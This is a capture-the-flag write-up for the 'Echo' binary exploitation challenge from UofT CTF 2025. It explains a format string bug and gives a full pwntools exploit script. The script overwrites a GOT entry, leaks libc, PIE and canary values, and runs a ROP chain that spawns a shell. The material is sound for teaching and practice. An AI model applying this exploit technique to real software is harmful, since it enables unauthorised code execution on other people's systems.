# Echo -UofT CTF 2025 (Pwn)
Author : White  
Description : Yet another echo service. However, the service keeps printing stack smashing detected for some reason, can you help me figure it out?  
## 1. Vulnerability Summary
**Protection**  
| RELRO         | Canary | NX   | PIE  |
|---------------|--------|------|------|
| Partial RELRO | Yes    | Yes  | Yes  |  

- The program accepts unrestricted input to `printf`, resulting in a format string vulnerability.
- The buffer begins at `rsp + 7`.
- The stack canary resides at `rbp + 8`, allowing precisely 1 byte of overflow without triggering detection.
- The `__stack_chk_fail@GOT` entry can be overwritten via format string write.
## 2. Exploitation Strategy
| Step            | Detail                                                        |
|-----------------|---------------------------------------------------------------|
| GOT Overwrite   | `__stack_chk_fail@GOT` → `vuln()` using FSB (Partial Overwrite)     |
| Info Leak       | libc, PIE, stack canary via FSB          |
| ROP             | Injected after bypassing canary; uses libc gadgets            |
## 3. Exploit Code
```python
from pwn import *

p = process('./chall', env={'LD_PRELOAD':'./libc.so.6'})
elf = ELF('./chall')
libc = ELF('./libc.so.6')

missing_byte = int(input(), 16)

overflow_offset = 0x8 * 8 + 1

vuln = elf.symbols['vuln']

patched_addr = (vuln % 0x1000) | ((missing_byte - 3) << 12)
print(hex(patched_addr))

fmt = f'%{ (vuln % 0x1000) | ((missing_byte - 3) << 12)}lx%15$hn'.encode()
payload = fmt.ljust(overflow_offset, b'A')
payload += (elf.got['__stack_chk_fail'] % 0x100).to_bytes(1, 'big')
payload += ((missing_byte << 4)).to_bytes(1, 'big')

p.send(payload)

sleep(1)

libc_leak_offset = 3
elf_leak_offset = 9
stack_leak_offset = 22
p.send(f'%{libc_leak_offset}$lx|%{elf_leak_offset}$lx|%{stack_leak_offset}$lx'.encode())

leak = p.recvrepeat(1)
leak = leak[leak.index(b'A'):]
leak = leak[leak.index(b'7'):]

libc_base = int(leak[:12], 16) - 0x114992
print("libc base :", hex(libc_base))

pie_base = int(leak[13:25], 16) - 0x1278
print("pie base :", hex(pie_base))

binsh = libc_base + next(libc.search(b'/bin/sh'))
system = libc_base + libc.symbols['system']
pop_rdi = libc_base + 0x2a3e5
ret = pie_base + 0x101a

print("/bin/sh :", hex(binsh))
print("system :", hex(system))
print("pop rdi; ret :", hex(pop_rdi))
print("ret :", hex(ret))

sleep(1)

p.send(b'AA')
canary_leak = p.recv()[1:9]
canary = b'\x00' + canary_leak[1:]
canary = int.from_bytes(canary, 'little')
print("canary :", hex(canary))

sleep(1)

ROP = b'A'
ROP += p64(canary)
ROP += b'B' * 0x8
ROP += p64(ret)
ROP += p64(pop_rdi)
ROP += p64(binsh)
ROP += p64(system)

p.send(ROP)

p.interactive()```
